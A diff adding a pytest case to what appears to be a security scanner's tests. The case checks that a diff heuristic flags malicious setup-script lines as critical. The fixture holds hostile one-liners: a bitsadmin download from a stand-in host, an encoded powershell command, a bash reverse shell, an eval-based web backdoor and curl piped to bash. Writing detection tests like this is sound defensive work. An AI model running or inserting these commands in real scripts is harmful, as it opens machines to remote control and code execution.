@@ -83,6 +83,22 @@ class TestHeuristics:
         assert "secret" in messages.lower() or "key" in messages.lower()
         assert any("rm -rf" in f["message"] for f in findings)
 
+    def test_finds_backdoor_and_malware(self):
+        diff = """\
++++ b/scripts/setup.bat
+@@ -1,1 +1,5 @@
++bitsadmin /transfer job https://evil.example/a.exe C:\\a.exe
++powershell -enc SQBFAFgA
++bash -i >& /dev/tcp/1.2.3.4/443 0>&1
++eval(request.args.get('cmd'))
++curl http://x | bash
+"""
+        findings = scan_diff_heuristics(diff)
+        messages = " ".join(f["message"].lower() for f in findings)
+        assert "backdoor" in messages or "reverse" in messages
+        assert "malware" in messages or "powershell" in messages or "bat" in messages
+        assert any(f["severity"] == "critical" for f in findings)
+
 
 class TestGitHubReview:
     @pytest.mark.asyncio
